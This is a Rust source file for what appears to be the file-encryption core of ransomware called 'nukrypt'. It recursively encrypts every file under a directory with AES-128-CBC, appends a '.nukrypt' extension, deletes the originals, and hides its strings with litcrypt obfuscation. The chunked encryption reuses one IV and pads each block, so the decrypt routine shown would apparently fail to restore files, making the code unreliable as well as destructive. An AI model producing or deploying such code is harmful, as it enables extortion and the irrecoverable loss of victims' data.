use std::fs;
use std::io::{Read, Write, Error, ErrorKind};

use rand::Rng;
use libaes::Cipher;
use litcrypt::{use_litcrypt, lc};


pub const SIZE_IV: usize = 16;
pub const SIZE_KEY: usize = libaes::AES_128_KEY_LEN;
pub const SIZE_BLOCK: usize = 32768;

macro_rules! nukrypt_key_ext  { () => { lc!(".nukrypt") } }

use_litcrypt!("nukrypt");


pub fn gen_key() -> [u8; SIZE_KEY] {
	rand::thread_rng().gen::<[u8; SIZE_KEY]>()
}

pub fn gen_iv() -> [u8; SIZE_IV] {
	rand::thread_rng().gen::<[u8; SIZE_IV]>()
}

pub fn read_key(path: &str, key: &mut [u8; SIZE_KEY]) -> Result<bool, Error> {
	let mut fin = fs::File::open(path)?;

	if fin.read(key)? != SIZE_KEY {
		return Err(Error::new(
			ErrorKind::UnexpectedEof, lc!("Failed to read key from file")
		));
	}

	Ok(true)
}

pub fn write_key(path: &str, key: &[u8; SIZE_KEY]) -> Result<bool, Error> {
	let mut fout = fs::File::create(path)?;
	fout.write(key)?;

	Ok(true)
}

pub fn encrypt_file(path: &str, key: &[u8; SIZE_KEY]) -> Result<bool, Error> {
	let path_out = format!("{}{}", path, nukrypt_key_ext!());

	let mut fin = fs::File::open(path)?;
	let mut fout = fs::File::create(&path_out)?;

	let mut buffer = [0u8; SIZE_BLOCK];

	let iv = gen_iv();
	let cipher: Cipher = Cipher::new_128(key);

	fout.write(&iv)?;

	loop {
		let n = fin.read(&mut buffer[..])?;

		if n == 0 {
			break;
		}

		let cipher_block = cipher.cbc_encrypt(&iv, &buffer[..n]);    
    
		if fout.write(&cipher_block)? == 0 {
			break;
		}
	}
    
	fs::remove_file(path)?;
	Ok(true)
}

pub fn decrypt_file(path: &str, key: &[u8; SIZE_KEY]) -> Result<bool, Error> {
	let path_out = match path.strip_suffix(nukrypt_key_ext!().as_str()) {
		Some(s) => s.to_owned(),
		None => path.to_string()
	};

	let mut fin = fs::File::open(path)?;
	let mut fout = fs::File::create(&path_out)?;

	let mut iv: [u8; SIZE_IV] = [0u8; SIZE_IV];
	let mut buffer = [0u8; SIZE_BLOCK];

	let cipher: Cipher = Cipher::new_128(key);

	fin.read(&mut iv[..])?;

	loop {
		let n = fin.read(&mut buffer[..])?;
    
		if n == 0 {
			break;
		}
    
		let cipher_block = cipher.cbc_decrypt(&iv, &buffer[..n]);
    
		if fout.write(&cipher_block)? == 0 {
			break;
		}
	}
    
	fs::remove_file(path)?;
	Ok(true)
}
    
pub fn encrypt_dir(path: &str, key: &[u8; SIZE_KEY]) -> usize {
	let mut counter: usize = 0;

	for e in fs::read_dir(path).unwrap() {
		let entry = e.unwrap();
		let filetype = entry.file_type().unwrap();

		if filetype.is_file() {
			println!("{} {}", lc!("[#] Encrypting:"), entry.path().display());

			match encrypt_file(entry.path().to_str().unwrap(), &key) {
				Ok(b)  => { if b { counter += 1 } },
				Err(e) => { println!("{} {}", lc!("[-] Failed:"), e) }
			}
		}
		else
		if filetype.is_dir() {
			counter += encrypt_dir(entry.path().to_str().unwrap(), key);
		}
	}

	counter
}

pub fn decrypt_dir(path: &str, key: &[u8; SIZE_KEY]) -> usize {
	let mut counter: usize = 0;

	for e in fs::read_dir(path).unwrap() {
		let entry = e.unwrap();
		let filetype = entry.file_type().unwrap();

		if filetype.is_file() {
			if ! entry.file_name().to_str().unwrap().ends_with(nukrypt_key_ext!().as_str()) {
				continue;
			}

			println!("{} {}", lc!("[#] Decrypting:"), entry.path().display());

			match decrypt_file(entry.path().to_str().unwrap(), &key) {
				Ok(b)  => { if b { counter += 1 } },
				Err(e) => { println!("{} {}", lc!("[-] Failed:"), e) }
			}
		}
		else
		if filetype.is_dir() {
			counter += decrypt_dir(entry.path().to_str().unwrap(), key);
		}
	}

	counter
}